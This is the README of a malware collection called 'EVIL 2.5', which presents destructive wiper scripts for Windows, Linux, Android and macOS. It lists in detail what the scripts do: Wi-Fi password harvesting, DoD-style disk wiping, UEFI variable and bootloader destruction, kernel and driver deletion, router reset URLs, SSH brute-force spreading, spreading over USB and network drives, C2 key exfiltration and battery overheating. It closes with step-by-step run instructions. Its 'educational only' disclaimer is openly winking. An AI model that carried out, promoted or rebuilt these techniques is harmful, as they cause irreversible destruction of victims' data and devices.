# Evil-Collection-2.5
EVIL 2.5 - cross-platform collection of scripts for complete and irreversible destruction of OS, data and bootloader. Supports Windows, Linux, Android (root/no-root), macOS. Result - total device death. For educational purposes only in isolated environment. Responsibility lies with the runner

# EVIL 2.5 - Cross-Platform Destructive Collection

**Warning: These scripts are for educational purposes only in isolated virtual environments. Running on real hardware will cause irreversible data loss, OS destruction, and permanent device damage. The author assumes no responsibility for any damage.**

---

## Platform Capabilities

### Windows 
# EVIL 6.6 NewGen 

| # | Feature | Details |
|---|---------|---------|
| 1 | **Wi-Fi Passwords Harvest** | Extracts all saved Wi-Fi passwords (русский/english fallback) |
| 2 | **Router Attack** | Reboot + factory reset + firmware kill (5+ methods) |
| 3 | **Full Disk Wipe (DoD 7-pass)** | Writes 7 patterns (0x00,0xFF,0x00,0xFF,0x00,0xFF,0xAA) to every sector |
| 4 | **clean all via diskpart** | Complete drive sanitization (all partitions removed) |
| 5 | **BitLocker Bypass** | Manage-bde -off on C:/D:/E: drives |
| 6 | **ESP Partition Destruction** | Mounts and wipes EFI System Partition even without drive letter |
| 7 | **UEFI Variables Destruction** | BootOrder, Boot0000-0005, BootCurrent, SecureBoot, PK, KEK, db, dbx — all wiped |
| 8 | **Windows Kernel Deletion** | ntoskrnl.exe, winload.exe, winload.efi, hal.dll — deleted via PendingFileRenameOperations |
| 9 | **50+ Critical Drivers Disabled** | disk, partmgr, storahci, stornvme, pci, acpi, ntfs, USBSTOR, USBHUB3, TCPIP, NDIS, and more |
| 10 | **Physical Driver File Deletion** | All *.sys in C:\Windows\System32\drivers — queued for deletion |
| 11 | **Registry Hive Destruction** | SYSTEM, SOFTWARE, SAM, SECURITY, DEFAULT — overwritten with 10MB of zeros |
| 12 | **Registry Classes Deletion** | HKLM\SOFTWARE\Classes — removed |
| 13 | **All Services Disabled** | HKLM\SYSTEM\CurrentControlSet\Services — Start=4 for every service |
| 14 | **All AppX Packages Removed** | Remove-AppxPackage -AllUsers |
| 15 | **System Files Queue for Deletion** | *.mui, *.dll, *.exe, Fonts, Media, Themes — all via PendingFileRenameOperations |
| 16 | **Network Adapters Disabled** | All adapters (except Loopback) — Disable-NetAdapter |
| 17 | **Wi-Fi Profiles Deleted** | netsh wlan delete profile * |
| 18 | **Routing Table Flushed** | route -f |
| 19 | **IP Stack Reset** | netsh int ip reset all |
| 20 | **Firewall Total Block** | blockinbound,blockoutbound + all rules disabled |
| 21 | **DNS Client Disabled** | sc config Dnscache start= disabled + sc stop |
| 22 | **WinRing0 Hardware Kill** | MSR write (CPU power), PCI config kill, EC ports, SATA/AHCI, Thunderbolt, TPM |
| 23 | **PnP Devices Disabled** | All non-critical devices (ACPI/PCI/Processor excluded) |
| 24 | **Logical Drives Overwrite** | Raw write 200×100MB to C:/D:/E: |
| 25 | **Network Spread** | Copies itself to all network drives (DriveType 4) |
| 26 | **USB Spread** | Copies itself to all USB drives (InterfaceType USB) |
| 27 | **Self-Deletion** | Set-PendingDelete on script itself |
| 28 | **Winlogon Kill + Shutdown** | Stop-Process winlogon + Stop-Computer -Force |

---

## Hardware Attack (WinRing0)

| Component | Action |
|-----------|--------|
| **CPU** | MSR write (0x1A0, 0x1B0) — disable power management, max load |
| **PCI Configuration** | Write 0x00000000 to command register for all devices (bus 0-255, dev 0-31, func 0-7) |
| **SATA/AHCI** | Disable storahci, msahci, pciide + driver deletion |
| **Embedded Controller** | Write to EC ports: 0x66/0x62, 0x68/0x6C, 0x290/0x291 |
| **TPM** | tpm.sys deletion + Start=4 |
| **Thunderbolt** | Thunderbolt, TbtBus, TbtP2p — disabled |

---

## Router Attack Methods

| Method | Target |
|--------|--------|
| `/reboot` | Generic routers |
| `/reset` | Factory reset |
| `/userRpm/SysRebootRpm.htm` | TP-Link |
| `/goform/reboot` | D-Link, Huawei |
| `/rebootinfo.cgi` | Various |

---

## Technical Details

| Action | Method | Persistence |
|--------|--------|-------------|
| Disk wipe | `\\.\PhysicalDriveN` raw write (DoD 7-pass) | Permanent |
| ESP kill | `mountvol Z: /s` + raw write + `Add-PartitionAccessPath` fallback | Permanent |
| Kernel delete | `PendingFileRenameOperations` registry | After reboot |
| Driver disable | `Start=4` in registry + PnP disable + `.sys` deletion | After reboot |
| Registry kill | Zero overwrite (10MB) + `PendingFileRenameOperations` | Permanent |
| UEFI variables | `Set-FirmwareEnvironmentVariable` (0xFF,0xFF,0xFF,0xFF) | Permanent |
| Network | Firewall block + adapter disable + DNS kill | Permanent |

---

## Irreversible Effects

- **All data on all drives** — permanently lost (DoD 7-pass + clean all)
- **Windows cannot boot** — bootloader + kernel + registry destroyed
- **Drives may not be detected** — storage drivers disabled + driver files deleted
- **UEFI/BIOS** — variables wiped, ESP destroyed
- **Network** — adapters disabled, firewall blocks all, DNS dead
- **Wi-Fi** — all profiles deleted
- **Router** — rebooted/reset (hardware brick on old models)

---

## ⚠️ Warning

**This script is for educational (or not:D) purposes only in isolated virtual environments.**

- Data recovery is impossible
- Windows reinstallation requires bootable USB
- Hardware is not physically damaged

### Linux (V-2.5) 
- Disables ufw, iptables, firewalld, AppArmor, SELinux
- Persistence (cron, rc.local, systemd)
- GPG AES256 file encryption
- Destroys MBR and GRUB bootloader
- Wipes /boot, /efi, /sys/firmware/efi/efivars
- Overwrites all drives (sd*, nvme*, vd*, xvd*, mmcblk*, hd*)
- Deletes all partitions via fdisk
- Kills all network interfaces
- SCP/SSH network spreading with password bruteforce
- Deletes all non-root users
- Disables PCI and USB devices
- Destroys /etc, /usr, /var, /opt, /srv
- Deletes all binaries (/bin, /sbin, /lib, /usr/bin)
- CPU fork bomb and GPU stress (glxgears/bc)
- Audio alarm and animated ASCII skull
- Self-deletion

### Android Root (V-2.5) 
- Gains root access
- Destroys bootloader (aboot, xbl, sbl1)
- Destroys recovery and boot (including A/B slots)
- Wipes all partitions (/dev/block/by-name/*, mmcblk*, sd*)
- Deletes /system, /data, /cache
- Encrypts files (rename + chmod 000)
- Disables Wi-Fi, Bluetooth, NFC, mobile data
- Network block via iptables
- Destroys IMEI and baseband
- CPU and GPU stress
- Battery overheating (max current request)
- Deletes contacts, SMS, call logs (content provider + SQLite)
- Removes all apps (pm clear + uninstall)
- Disables sensors, touchscreen, vibrator
- Kills display (fb0 blank)
- Max volume audio
- Self-deletion and reboot to bootloader

### Android No Root (V-2.5) 
- Disables ADB, Wi-Fi, Bluetooth, airplane mode
- Destroys all user files (/sdcard/* with random overwrite)
- Deletes contacts, SMS, call logs
- Clears and removes user apps
- Disables system apps
- Full network block (iptables DROP)
- CPU and memory stress
- Input spam and window flooding
- Max volume audio playback
- Notification with skull
- Self-deletion and reboot

### macOS (V-2.5) 
- Disables Gatekeeper and firewall
- Launchd persistence
- GPG AES256 file encryption
- C2 key exfiltration
- Disables all network interfaces
- Destroys DNS and IPv6
- SCP/SSH network spreading
- Overwrites all drives (dd + diskutil erase + gpt destroy)
- Deletes drivers (/Library/Extensions)
- Destroys /etc, /usr/local/bin, /Library/Application Support
- Deletes all non-root users
- CPU and GPU stress
- Max volume audio (say + afplay)
- Finder alert dialog
- Deletes binaries (/bin, /sbin, /usr/bin, /usr/sbin)
- Self-deletion and halt

---

## How to Run

### Windows
1. Open PowerShell as Administrator
2. Run: `Set-ExecutionPolicy Bypass -Scope Process`
3. Run: `.\evil_windows_2.5.ps1`
or through the desktop

### Linux / macOS
1. Open terminal
2. Make executable: `chmod +x evil_linux_2.5.sh`
3. Run as root: `sudo ./evil_linux_2.5.sh`
or through the desktop

### Android (Root)
1. Install a terminal app (e.g., Termux)
2. Gain root access (Magisk or similar)
3. Run: `su -c "sh /sdcard/evil_android_root_2.5.sh"`

### Android (No Root)
1. Install Termux
2. Run: `sh /sdcard/evil_android_no_root_2.5.sh`

---

## License
MIT

## Author
Artem (RUS)
